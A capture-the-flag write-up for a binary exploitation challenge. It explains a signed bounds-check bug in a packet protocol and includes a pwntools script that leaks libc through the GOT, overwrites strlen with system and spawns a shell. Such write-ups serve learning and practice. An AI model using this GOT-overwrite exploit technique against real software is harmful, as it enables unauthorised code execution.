# They Said We'd Have Flying Cars

- Category: pwn

"They said we'd have flying cars. Instead, we got tung tung, negative aura and memory corruption."

A binary packet protocol over stdin with a stowage array of 16 slots. The array index is bounds-checked, which is exactly why the bug is easy to miss: the check is there, it is just the wrong kind of check.

### Solution:

##### 1. The protocol, and where the index goes

`fly` is non-PIE with Partial RELRO, NX and a canary, but none of that ends up mattering. The whole program is one dispatch loop (`sub_4012ae`) over four ops, each length-prefixed and read with a `read`-until-complete helper:

```
op1 STOW  [i32 idx][u64 val]
op2 CHECK [i32 idx]
op3 HAIL  [8 bytes]
op4 EOF
```

`STOW` and `CHECK` both index a 16-entry array of qwords at `0x4040a0`. Both bound the index first — and both get it wrong the same way:

```asm
; STOW
0040135e:  mov    edx,dword ptr [rsp + 0xc]
00401362:  cmp    edx,0xf
00401365:  jle    0x401380              ; SIGNED compare, upper bound only
00401380:  movsxd rdx,edx               ; SIGN-extended
00401383:  mov    qword ptr [0x4040a0 + rdx*0x8],rax

; CHECK
004013ba:  cmp    eax,0xf
004013bd:  jg     0x4013dd              ; SIGNED again
004013bf:  cdqe                         ; SIGN-extended again
004013c1:  lea    rsi,[0x4040a0 + rax*0x8]
```

`jle`/`jg` are the signed forms, and there is no lower bound at all. Any negative `idx` passes, then `movsxd`/`cdqe` faithfully sign-extend it into the address computation. That is an arbitrary 8-byte read *and* an arbitrary 8-byte write at `0x4040a0 + idx*8`, for any `idx` down to `INT_MIN`.

##### 2. Negative indices land on the GOT

The binary is non-PIE, so `0x4040a0` is a fixed address, and Partial RELRO leaves `.got.plt` writable. The distance from the array to each GOT slot is a compile-time constant:

```
write@GOT            0x404018   idx = -17
strlen@GOT           0x404020   idx = -16
__stack_chk_fail     0x404028   idx = -15
read@GOT             0x404030   idx = -14
setvbuf@GOT          0x404038   idx = -13
```

`CHECK -17` prints `write`'s resolved libc address; `write` is called in the banner before we get a prompt, so the slot is already bound. That is the ASLR leak, for one packet and no format string.

##### 3. `HAIL` hands over the argument for free

The third op is the reason no ROP chain is needed:

```asm
004013f3:  mov    esi,0x8
004013f8:  mov    edi,0x404080
004013fd:  call   0x4011b6              ; read exactly 8 bytes to 0x404080
...
00401420:  mov    edi,0x404080
00401425:  call   0x401090              ; strlen@plt(0x404080)
0040142a:  mov    rdx,rax
0040142d:  mov    esi,0x404080
00401432:  call   0x401080              ; write(1, 0x404080, rdx)
```

`HAIL` reads 8 attacker bytes into a fixed buffer and then calls `strlen` **on that buffer**. So `strlen`'s GOT entry is a function pointer whose argument we already control. Point it at `system`, send `"/bin/sh\0"` — exactly 8 bytes — and the echo becomes `system("/bin/sh")`. `strlen` is only ever called here, so overwriting its slot breaks nothing on the way.

##### 4. Three packets

```python
BAY = 0x4040a0
idx_of = lambda addr: (addr - BAY) // 8

io.send(b"\x02" + p32(idx_of(elf.got["write"]), sign="signed"))
libc.address = u64(io.recv(8)) - libc.sym["write"]

io.send(b"\x01" + p32(idx_of(elf.got["strlen"]), sign="signed") + p64(libc.sym["system"]))
io.recvuntil(b"[stowed]\n")

io.send(b"\x03" + b"/bin/sh\x00")
```

One detail worth pinning down before sending anything: despite being a "binary packet protocol", the wire format is **little-endian**, not network order. `STOW`'s u64 parser walks the 8-byte buffer backwards, shifting left as it goes —

```asm
00401339:  lea    rsi,[rsp + 0x10]      ; first byte
0040133e:  lea    rdx,[rsp + 0x17]      ; last byte
00401348:  shl    rax,0x8
0040134c:  movzx  ecx,byte ptr [rdx]
0040134f:  or     rax,rcx
00401355:  sub    rdx,0x1
```

— which puts `buf[0]` in the *least* significant position. So `p64`/`p32`, not `p64(..., endian='big')`. Reading that loop out of the disassembly rather than assuming took less time than one failed round trip would have.

```
$ ./solve.py remote
[+] write@GOT     = 0x7f3d0a5148b0
[+] libc base     = 0x7f3d0a400000
[+] strlen@GOT   := system (0x7f3d0a450d70)
[*] Switching to interactive mode
$ cat /flag.txt
sunctf26{n3g4t1v3_4ur4_s1gn3d_us_str41ght_1nt0_0rb1t}
```

Full script: [solve.py](solve.py)

**Flag:** `sunctf26{n3g4t1v3_4ur4_s1gn3d_us_str41ght_1nt0_0rb1t}`

### Takeaways

- `cmp reg, N` followed by `jle`/`jg`/`jl`/`jge` is a **signed** bound. The unsigned forms are `jbe`/`ja`/`jb`/`jae`. When a challenge does check its index, that one-letter difference is usually the whole bug — and `movsxd`/`cdqe` right after the branch is the confirming tell that the value is being treated as signed all the way into the address.
- An indirect call whose argument is a fixed buffer you can write is strictly better than a ROP chain: no stack pivot, no gadget hunting, no alignment worries. Look for a GOT entry the program calls on data you control (`strlen`, `puts`, `atoi` on an input buffer) before reaching for `pop rdi`.
